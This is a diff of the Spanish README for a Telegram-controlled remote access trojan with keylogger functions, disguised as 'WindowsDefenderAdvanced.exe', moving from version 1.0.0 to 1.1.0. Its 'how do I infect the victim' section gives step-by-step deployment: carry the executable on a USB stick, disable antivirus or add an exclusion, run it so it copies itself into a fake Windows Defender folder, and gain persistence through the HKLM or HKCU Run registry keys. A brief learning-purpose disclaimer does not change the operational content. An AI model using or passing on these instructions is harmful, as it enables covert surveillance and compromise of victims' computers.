@@ -6,7 +6,7 @@
   ║║║╚╣╔═╗║ ║║  ╚╗╔╣║╔╗║  ║║║║═╣╚╣║═╣╚╝║║║╔╗║║║║ ╚╗╔╗╔╣║║║║╚╝║╚╝╠╗╔╗╔╬══║
   ╚╝╚═╩╝ ╚╝ ╚╝   ╚╝╚╩╝╚╝  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝  ╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚╝╚══╝
                                     ╔═╝║                 
-                                    ╚══╝                   v 1.0.0
+                                    ╚══╝                   v 1.1.0
 ````
 [![Made with Python](https://img.shields.io/badge/Made%20with-Python-3572A5.svg)](https://github.com/SebastianEPH)
 
@@ -17,8 +17,8 @@ __Nota:__ Éste proyecto tiene como finalidad el aprendizaje de ciberseguridad y
 [Read this documentation in English](Doc/README.md)
 
 # Información Importante
-* __Fecha de documentación :__ `07/05/2020`
-* __Versión:__ v`1.0.0`
+* __Fecha de documentación :__ `09/05/2020`
+* __Versión:__ v`1.1.0`
 * __Peso compilado:__ `45MB` aproximadamente
 * __Versión Python:__ `3.7` (Obligatoriamente debe ser ésta versión)
 * __Licencia:__ `MIT licence`
@@ -32,7 +32,7 @@ __Nota:__ Éste proyecto tiene como finalidad el aprendizaje de ciberseguridad y
 - `LICENCE` = Licencia 
 - `proxy.py` = librería `*.py` , _no mover ni modificar_
 - `README.md`= Ésta Documentación
-- `StartUp.reg` = Modifica el Registro de Windows
+- `StartUp.reg` = [Modifica el Registro de Windows] <== _En la versión_ __1.1.0__ _se eliminó éste archivo ya que ahora este archivo viene incluido dentro del código_
 - `versionN.txt` = Información detalla de conversión `*.py` a `*.exe`
 - `WindowsDefenderAdvanced.py` = Código fuente del RAT via Telegram Windows
 
@@ -43,17 +43,18 @@ __Librerías utilizadas__
 
 * __import__ `winshell`
 * __import__ `tendo`
+* __import__ `winreg` <== Permite modificar el registro de Windows
 * __import__ `pypiwin32`
-* __import__ `pyinstaller`
+* __import__ `pyinstaller` <= Compila el proyecto
 * __import__ `psutil`
 * __import__ `pillow`
 * __import__ `opencv-python`
 * __import__ `sys`
-* __import__ `threading`
+* __import__ `threading` <= Permite ejecución multihilos
 * __import__ `datetime`
 * __import__ `argparse`
 * __import__ `logging`
-* __import__ `socket`
+* __import__ `socket` <== Verifica conexión a internet 
 * __import__ `select`
 
 # Funcionalidades
@@ -242,7 +243,7 @@ __Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con to
 
   ![chat id](https://i.imgur.com/3GEs4g2.png)
 
-* Y este chat ID tenemos que escribirlo en el archivo `WindowsDefenderAdvanced.py`
+* Ahora con el ID único que obtuvimos, tenemos que escribirlo dentro del archivo `WindowsDefenderAdvanced.py`
 
   ![](https://i.imgur.com/psqD3sj.png)
 
@@ -268,19 +269,23 @@ Y colocamos la ruta de la carpeta donde se encuentra el RAT
 
 # Método de infección:
 ___¿Cómo infecto a la victima?___
+* El archivo compilado es el siguiente
 
-![Final files](https://i.imgur.com/lGjXUlC.png)
-- Usten tendrá al finalizar 2 archivos:
-- El archivo llamado `WindowsDefenderAdvanced.exe` que es el RAT
-- El archivo llamado `StartUp.reg`, modifica el registro de windows, y hace que el `RAT`se ejecute siempre al iniciar el usuario.
+  ![Final files](https://i.imgur.com/N7obd7w.png)
 
-__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia de nombre, algunas funcionalidades , como la del troyano no se iniciarán.
-- Usten guardará esos archivos en un USB
+
+__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia de nombre, el RAt quedará obsoleto.
+- Usten guardará el archivo en un USB
 - Es necesario desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`
-- Lo siguiente es ejecutar el archivo `WindowsDefenderAdvanced.exe` en el USB, el RAT se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el keylogger se estará replicando en la ruta.
-- Lo siguiente es darle 2 click al archiv `StartUp.reg`, y ésto hará que el registro de windows sea modificado y el keylogger se ejecute 
-- __Nota:__ No hay un orden fijo, usted puede ejecutar primero el archivo `WindowsDefenderAdvanced.exe` cómo el archivo `StartUp.reg` y  ésto no causará ningún problema.
+- Lo siguiente es ejecutar el archivo `WindowsDefenderAdvanced.exe` en el USB, el RAT se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `RAT` se estará replicando en la ruta.
 
+__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.
+
+El RAT tratará de modificar la siguiente ruta del registro `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el RAT modificará la siguiente ruta `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
+
+__Explicación:__ 
+* `HKEY_LOCAL_MACHINE:` El RAT se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
+* `HKEY_CURRENT_USER:` El RAT solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el RAT Solo funcionará en el usuario principal
 ___
 ___
 # Creador 
